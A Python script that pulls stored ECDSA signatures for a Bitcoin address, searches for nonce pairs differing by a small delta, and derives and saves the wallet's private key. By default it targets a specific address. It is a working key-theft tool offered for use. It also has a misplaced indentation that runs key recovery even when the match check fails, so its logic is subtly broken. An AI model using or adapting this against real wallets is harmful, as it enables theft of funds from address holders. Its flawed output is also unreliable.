import sqlite3
import collections
import ecdsa
from ecdsa import SECP256k1
from ecdsa.numbertheory import inverse_mod

N = SECP256k1.order
G = SECP256k1.generator

def scan_cross_tx_delta_optimized(address, max_sigs=500):
    conn = sqlite3.connect('cryscout.db')
    cursor = conn.cursor()
    # Need pubkey for this optimization
    cursor.execute('SELECT r_int, s_int, z_int, pubkey_hex, txid FROM signatures WHERE address = ? AND pubkey_hex IS NOT NULL AND pubkey_hex != "" LIMIT ?', (address, max_sigs))
    rows = cursor.fetchall()
    conn.close()
    
    if len(rows) < 2:
        print(f"Not enough sigs with pubkeys for {address}")
        return
    
    pub_hex = rows[0][3]
    pub_bytes = bytes.fromhex(pub_hex)
    if pub_hex.startswith('04'):
        vk = ecdsa.VerifyingKey.from_string(pub_bytes[1:], curve=SECP256k1)
    else:
        vk = ecdsa.VerifyingKey.from_string(pub_bytes, curve=SECP256k1)
    Q = vk.pubkey.point
    
    sigs = []
    for r, s, z, _, txid in rows:
        sigs.append({'r': int(r), 's': int(s), 'z': int(z), 'txid': txid})
        
    print(f"Scanning {len(sigs)} sigs for Cross-TX Delta bias for {address} (Optimized)...")
    
    # Pre-calculate P_i = k_i*G = s_i^-1 * (z_i*G + r_i*Q)
    points = []
    for i, sig in enumerate(sigs):
        s_inv = inverse_mod(sig['s'], N)
        point = s_inv * (sig['z'] * G + sig['r'] * Q)
        points.append(point)
        if i % 50 == 0 and i > 0:
            print(f"  Calculated {i} points...")

    P_prime = SECP256k1.curve.p()
    # Pre-calculate delta*G
    delta_points = {}
    for delta in range(1, 101):
        dg = delta * G
        delta_points[delta] = dg
        # Point negation: (x, y) -> (x, P-y)
        neg_dg = ecdsa.ellipticcurve.Point(SECP256k1.curve, dg.x(), P_prime - dg.y())
        delta_points[-delta] = neg_dg

    # Use hash map for O(N * range)
    # Store points in a way that allows fast lookup
    # We use x-coordinate as key for fast filtering
    point_map = collections.defaultdict(list)
    for i, p in enumerate(points):
        point_map[p.x()].append((i, p))

    for i in range(len(points)):
        for delta, dg in delta_points.items():
            # target = points[i] - delta*G
            # points[j] == target
            target = points[i] + (delta_points[-delta])
            tx = target.x()
            if tx in point_map:
                for j, pj in point_map[tx]:
                    if i != j and pj == target:
                        print(f"!!! SUCCESS !!! Cross-TX Nonce delta found!")
                        print(f"  k_{i} = k_{j} + {delta}")
                    # Recover d
                    s1, s2 = sigs[i], sigs[j]
                    num = (delta * s1['s'] * s2['s'] + s1['s'] * s2['z'] - s2['s'] * s1['z']) % N
                    den = (s2['s'] * s1['r'] - s1['s'] * s2['r']) % N
                    d = (num * inverse_mod(den, N)) % N
                    print(f"  Private Key: {hex(d)}")
                    
                    # Save to DB
                    from db_manager import add_recovered_key
                    add_recovered_key(address, hex(d)[2:].zfill(64), method=f'Cross-TX Delta (delta={delta})')
                    return True
                    
    print("No Cross-TX delta found.")
    return False

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "1AV4KGCsvtPZ9tG7hvwgb85wJyFd9xdpFv"
    scan_cross_tx_delta_optimized(target)
